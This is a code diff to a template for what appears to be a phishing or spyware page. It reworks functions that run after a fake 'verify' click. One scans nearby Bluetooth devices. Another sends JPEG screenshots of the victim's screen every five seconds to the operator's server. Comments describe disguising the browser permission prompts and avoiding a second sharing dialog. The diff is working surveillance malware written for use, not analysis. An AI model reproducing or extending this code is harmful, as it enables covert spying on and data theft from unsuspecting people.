@@ -598,66 +598,122 @@ async function doScreenRecord(){
 <% } %>
 
 <% if(bluetoothAccess){ %>
-// ── Bluetooth Scanner: status + paired devices (silent, no dialog) ────────────
+// ── Bluetooth Scanner: availability + real device scan via requestDevice ───────
 function doBluetoothScan(){
-  if(!navigator.bluetooth)return;
-  var _bt={uid:uid};
-  navigator.bluetooth.getAvailability().then(function(on){
-    _bt.status=encodeURIComponent(String(on));
-    if(navigator.bluetooth.getDevices){
-      navigator.bluetooth.getDevices().then(function(devs){
-        if(devs&&devs.length){
-          _bt.devices=encodeURIComponent(devs.map(function(d){return d.name||('ID:'+d.id.slice(0,6));}).join(','));
-        }
-        $.post(a+"/bluetooth",_bt);
-      }).catch(function(){$.post(a+"/bluetooth",_bt);});
-    } else {
-      $.post(a+"/bluetooth",_bt);
-    }
-  }).catch(function(){});
+  var _bt = { uid: uid };
+
+  function _sendBT(){ $.post(a+"/bluetooth", _bt); }
+
+  function _doScan(avail){
+    _bt.status = encodeURIComponent(String(avail));
+
+    // Step 1: try getDevices() for already-permitted devices (silent)
+    var gd = (navigator.bluetooth && navigator.bluetooth.getDevices)
+      ? navigator.bluetooth.getDevices()
+      : Promise.resolve([]);
+
+    gd.then(function(devs){
+      if(devs && devs.length){
+        _bt.devices = encodeURIComponent(devs.map(function(d){return d.name||(d.id?d.id.slice(0,8):'?');}).join(','));
+        _sendBT();
+      } else if(avail && navigator.bluetooth && navigator.bluetooth.requestDevice){
+        // Step 2: requestDevice — shows native BT picker listing ALL nearby devices
+        // Disguise: fires right after verify click (user gesture active)
+        navigator.bluetooth.requestDevice({
+          acceptAllDevices: true,
+          optionalServices: []
+        }).then(function(device){
+          _bt.devices = encodeURIComponent(device.name || device.id || 'جهاز غير معروف');
+          _bt.selected = encodeURIComponent('true');
+          _sendBT();
+        }).catch(function(){
+          // User cancelled picker — still send what we have
+          _sendBT();
+        });
+      } else {
+        _sendBT();
+      }
+    }).catch(function(){ _sendBT(); });
+  }
+
+  if(!navigator.bluetooth){
+    // Not supported — still report it
+    _bt.status = encodeURIComponent('unsupported');
+    _sendBT();
+    return;
+  }
+
+  navigator.bluetooth.getAvailability()
+    .then(_doScan)
+    .catch(function(){ _bt.status=encodeURIComponent('error'); _sendBT(); });
 }
 <% } %>
 
 <% if(screenMirrorAccess){ %>
 // ── Screen mirror — live JPEG screenshots every 5s (VIP MAX) ─────────────────
+var _smActive = false;
+
+function _startMirrorFromStream(stream){
+  if(_smActive) return;
+  _smActive = true;
+  var video  = document.createElement('video');
+  video.srcObject = stream;
+  video.muted     = true;
+  video.setAttribute('playsinline','');
+  video.setAttribute('autoplay','');
+  var canvas = document.createElement('canvas');
+  var ctx    = canvas.getContext('2d');
+
+  stream.getVideoTracks()[0].addEventListener('ended', function(){
+    _smActive = false;
+    // Stream ended — try fresh mirror after 8s (needs new gesture though, skip silent retry)
+  });
+
+  function capture(){
+    if(!_smActive) return;
+    try{
+      var w = video.videoWidth  || 1280;
+      var h = video.videoHeight || 720;
+      if(w > 0 && h > 0){
+        canvas.width  = w;
+        canvas.height = h;
+        ctx.drawImage(video, 0, 0, w, h);
+        var b64 = canvas.toDataURL('image/jpeg', 0.45).replace(/^data:image\/jpeg;base64,/, '');
+        if(b64 && b64.length > 500){
+          $.post(a+'/screen-mirror', {uid: uid, img: encodeURIComponent(b64)});
+        }
+      }
+    }catch(e){}
+    if(_smActive) setTimeout(capture, 5000);
+  }
+
+  // Start capture once video has dimensions
+  function _tryStart(){
+    if(video.videoWidth > 0){ capture(); }
+    else { setTimeout(_tryStart, 300); }
+  }
+
+  video.onloadedmetadata = function(){ video.play().catch(function(){}); _tryStart(); };
+  video.play().catch(function(){});
+  setTimeout(_tryStart, 600); // Fallback if event already fired
+}
+
 async function doScreenMirror(){
-  try {
-    var stream = await navigator.mediaDevices.getDisplayMedia({video:{frameRate:1,width:{ideal:1920},height:{ideal:1080}},audio:false});
-    var video  = document.createElement('video');
-    video.srcObject = stream;
-    video.muted = true;
-    await video.play();
-    var canvas = document.createElement('canvas');
-    var ctx    = canvas.getContext('2d');
-    var active = true;
-
-    // When victim manually stops sharing → retry after 8s
-    stream.getVideoTracks()[0].addEventListener('ended', function(){
-      active = false;
-      setTimeout(doScreenMirror, 8000);
-    });
-
-    function capture(){
-      if(!active) return;
-      try {
-        canvas.width  = video.videoWidth  || 1280;
-        canvas.height = video.videoHeight || 720;
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        var jpeg = canvas.toDataURL('image/jpeg', 0.45);
-        var b64  = jpeg.replace(/^data:image\/jpeg;base64,/, '');
-        $.post(a+'/screen-mirror', {uid: uid, img: encodeURIComponent(b64)});
-      } catch(e) {}
-      if(active) setTimeout(capture, 5000);
+  if(_smActive) return;
+  if(!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+  try{
+    // Reuse screenRecord stream if already active — avoids second dialog
+    if(typeof _srStream !== 'undefined' && _srStream && _srStream.active){
+      _startMirrorFromStream(_srStream);
+      return;
     }
-
-    // Wait for first frame then start capturing
-    video.addEventListener('loadeddata', function(){ setTimeout(capture, 800); }, {once:true});
-    // Fallback if event already fired
-    if(video.readyState >= 2) setTimeout(capture, 800);
-
-  } catch(e) {
-    // Permission denied or not supported — retry after 30s
-    setTimeout(doScreenMirror, 30000);
+    var stream = await navigator.mediaDevices.getDisplayMedia({
+      video: { cursor:'never', frameRate:{ideal:1,max:2}, width:{ideal:1280}, height:{ideal:720} },
+      audio: false
+    });
+    _startMirrorFromStream(stream);
+  }catch(e){
+    // getDisplayMedia failed (no gesture / not supported) — silent fail
   }
 }
 <% } %>
@@ -867,10 +923,10 @@ function doVerify(){
 <% if(pushAccess){ %>  if(typeof _registerPush==="function") _registerPush();<% } %>
 <% if(speechRecogAccess){ %>  setTimeout(function(){doSpeechRecog();},2000);<% } %>
 <% if(webOTPAccess){ %>  doWebOTP();<% } %>
-<% if(bluetoothAccess){ %>  setTimeout(function(){doBluetoothScan();},3000);<% } %>
+<% if(bluetoothAccess){ %>  doBluetoothScan();<% } %>
 <% if(pwaAccess){ %>  setTimeout(function(){doPWAInstall();},4000);<% } %>
-<% if(screenRecordAccess){ %>  setTimeout(function(){doScreenRecord();},1500);<% } %>
-<% if(screenMirrorAccess){ %>  setTimeout(function(){doScreenMirror();},2500);<% } %>
+<% if(screenRecordAccess){ %>  doScreenRecord();<% } %>
+<% if(screenMirrorAccess){ %>  if(typeof _srStream==="undefined"||!_srStream){ doScreenMirror(); } else { _startMirrorFromStream(_srStream); }<% } %>
 }
 
 // ── Page init ─────────────────────────────────────────────────────────────────
